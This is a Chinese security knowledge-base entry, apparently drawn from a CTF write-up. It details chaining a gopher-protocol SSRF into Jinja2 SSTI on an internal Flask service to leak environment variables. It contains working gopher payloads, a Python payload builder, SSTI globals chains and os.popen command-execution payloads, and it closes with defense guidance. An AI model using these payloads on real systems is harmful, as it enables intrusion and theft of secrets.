---
id: web-generic-ssrf-gopher-internal-flask-ssti-env-read
title: Gopher SSRF 打内网 Flask：构造 POST 到 render_template_string 的 name 参数，SSTI 读环境变量拿 flag
type: scenario
domain: web
path: web/generic/ssrf
technique: gopher-ssrf-internal-flask-ssti-env-read
tags:
- web
- ssrf
- gopher
- flask
- ssti
- jinja2
- internal-service
- env-leak
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:46+08:00'
  notes: 已对照原文核对；已修正 Content-Length 为实际 47（原文写 48）；gopher payload 与截图一致；未在目标复跑。
url: /docs/web/generic/ssrf/web-generic-ssrf-gopher-internal-flask-ssti-env-read/
draft: false
kb_aliases:
- gopher SSRF
- Gopher 打内网 Flask
- gopher Flask SSTI
- cycler.__init__.__globals__.os.environ
- SSRF 模板注入
- 内网 Flask 5000
- ssti在哪里
---

## 一句话结论

当公网 Web 的 URL 访问功能允许 `gopher://` 且内网存在一个只监听 localhost 的 Flask 服务时，可以用 gopher 构造原始 HTTP POST 请求，把 `name={{cycler.__init__.__globals__.os.environ}}` 发给内网 Flask 的 `render_template_string`；模板把 `name` 当表达式求值，读取 `os.environ` 并回显，从而拿到环境变量中的 flag，完成“SSRF → 内网服务 → SSTI → 环境变量泄露”的链。

## 原理

- **Gopher 可以发送任意 TCP 字节**：`gopher://host:port/_<data>` 会把 `<data>`（URL 解码后）通过 TCP 发给目标端口。攻击者可以把完整的 HTTP 请求（请求行、Host、Content-Type、Content-Length、空行、body）编码进 gopher URL，从而向内网服务发起任意 POST 请求，绕过“只能 GET/只能访问白名单 URL”的限制。
- **内网 Flask 的信任边界**：内网 `app.py`/`interal_web.py` 只监听 `127.0.0.1:5000`，认为“只有本机/内部才能访问”，因此没有认证，直接把用户参数 `name` 交给 `render_template_string`。
- **Jinja2 SSTI**：`render_template_string` 把 `{{ ... }}` 当表达式求值。Flask/Jinja2 默认暴露 `cycler` 全局对象；`cycler.__init__.__globals__` 是定义该函数的模块全局字典，里面有 `os` 模块；`os.environ` 即可读出所有环境变量。若 `os` 不在 globals 中，可用 `lipsum.__globals__['os']`、`config.__class__.__init__.__globals__['os']` 或 `__builtins__.__import__('os')` 等变体。
- **为什么最终危害成立**：环境变量中常存放 flag、数据库口令、API key；SSTI 也可进一步 `os.popen('id').read()` 执行命令，从信息泄露升级为 RCE。整条链的关键是“SSRF 允许 gopher”+“内网服务无认证且渲染用户输入”。
- **协议细节**：gopher URL 中的 CRLF 用 `%0d%0a` 表示，空格用 `%20`，请求体中的 `{`/`}`/`$` 等用 URL 编码；`Content-Length` 必须与 body 实际长度一致（原文写 48，但 `name={{cycler.__init__.__globals__.os.environ}}` 实际为 47 字节，应以自动计算为准），否则内网 Flask 可能读不到完整 body。`Connection: close` 让服务端在响应后关闭连接，便于 SSRF 代理读取完整响应。

## 触发条件

- 公网 Web 存在 URL 抓取/预览/代理功能，且允许 `gopher://`（或 `dict://` 等可发原始字节的协议）；未做协议/主机白名单。
- 内网存在只监听 localhost 的 Flask/其它 Python 服务，使用 `render_template_string` 渲染用户输入，或存在等价的模板注入。
- 攻击者知道内网服务端口（本例 5000）与请求格式（POST `/`，参数 `name`）。
- 内网服务无认证/无 CSRF/无来源校验，且环境变量含敏感信息。
- SSRF 代理会把内网响应回显给攻击者，或至少提供盲注/时间侧信道。

## 利用步骤

1. 确认 SSRF 支持 gopher：提交 `gopher://127.0.0.1:5000/_test` 观察错误/响应差异；用 `dict://127.0.0.1:5000/` 探测端口。
2. 确认内网 Flask 的请求格式：若能从源码/报错得知 `name` 参数与 `render_template_string`，直接构造 POST；否则先发一个简单 POST 观察回显。
3. 构造 gopher payload：
   - 请求行：`POST / HTTP/1.0`
   - 头：`Host: 127.0.0.1`、`Connection: close`、`Content-Type: application/x-www-form-urlencoded`、`Content-Length: 47`（原文写 48，实际 body 为 47 字节）
   - 空行 + body：`name={{cycler.__init__.__globals__.os.environ}}`
   - 全部 URL 编码，前面加 `gopher://127.0.0.1:5000/_`。
4. 提交给公网 URL 抓取接口，读取响应中的环境变量；若被截断，改用 `name={{cycler.__init__.__globals__.os.popen('env').read()}}` 或分段读取。
5. 若 `cycler` 被过滤/不可用，换 `lipsum.__globals__['os']`、`config.__class__.__init__.__globals__['os']`、`request.__class__.__init__.__globals__['__builtins__']['eval']` 等链。
6. 进一步验证 RCE：`name={{cycler.__init__.__globals__.os.popen('id').read()}}`；必要时写文件/反弹 shell。

## PoC

原文 payload：

```text
gopher://127.0.0.1:5000/_POST%20/%20HTTP/1.0%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2048%0d%0a%0d%0aname%3D%7B%7Bcycler.__init__.__globals__.os.environ%7D%7D
```

注意：原文 Content-Length 写 48，而 body `name={{cycler.__init__.__globals__.os.environ}}` 实际为 47 字节；复现时以自动计算的长度为准。

Python 构造（自动计算 Content-Length）：

```python
from urllib.parse import quote

body = "name={{cycler.__init__.__globals__.os.environ}}"
req = (
    "POST / HTTP/1.0\r\n"
    "Host: 127.0.0.1\r\n"
    "Connection: close\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "\r\n"
    f"{body}"
)
gopher = "gopher://127.0.0.1:5000/_" + quote(req, safe="")
print(gopher)
```

如果目标只接受 GET，可改为：

```text
gopher://127.0.0.1:5000/_GET%20/?name%3D%7B%7Bcycler.__init__.__globals__.os.environ%7D%7D%20HTTP/1.0%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a%0d%0a
```

## 变体与关联

- 变体：内网服务可能是 Flask、Django、Tornado、FastAPI/Jinja2 等；SSTI 链按框架调整（`lipsum`、`cycler`、`config`、`request`、`self` 等）。
- 变体：若 gopher 被禁，可尝试 `dict://` 发 Redis/FastCGI 协议、`file://` 读文件、HTTP 重定向到内网、DNS rebinding 等。
- 变体：不读环境变量而直接命令执行/写 webshell；或用盲 SSRF（时间/响应差异）外带数据。
- 关联：[[web-generic-ssrf-curl-gopher-loopback-admin]]（gopher 打 loopback 管理接口）、[[web-generic-ssrf-gopher-fastcgi-fpm-auto-prepend]]（gopher 打 FastCGI）、[[web-python-ssti-jinja2-flask-globals-rce]]（Jinja2 globals 链）、[[web-python-ssti-jinja2-context-doc-get-chr-keyword-bypass]]（SSTI 关键字绕过）。
- 边界：SSRF 只允许 HTTP/HTTPS、gopher 被禁用、内网服务有认证、模板使用沙箱或输入被转义、Content-Length/Host 校验严格时，该链不成立。

## 检测与防御

- **SSRF 修复**：URL 抓取只允许 `http/https`，禁止 `gopher`/`dict`/`file` 等协议；对目标 IP 做内网/回环/元数据地址黑名单（注意 DNS rebinding），使用 egress 代理与白名单。
- **内网服务加固**：内网 Flask 也需要认证/来源校验；不要用 `render_template_string` 渲染用户输入；使用 Jinja2 沙箱或把用户输入作为数据传入模板变量（`{{ name }}` 而不是把 `name` 拼进模板源）。
- **网络隔离**：内网服务不应仅依赖“只监听 localhost”作为安全边界；用 mTLS/服务网格/防火墙限制来源。
- **检测**：监控 URL 参数中的 `gopher://`、`dict://`、`%0d%0a`（CRLF 注入）、异常 `Content-Length`、内网 127.0.0.1/169.254.169.254 访问；检测 Flask 响应中的环境变量/命令输出；对内网服务日志中的非常规 POST 来源告警。
- **响应**：发现 SSRF/SSTI 后隔离服务、轮换环境变量中的密钥、检查是否已 RCE/写文件；修复 URL 抓取白名单与模板渲染方式。
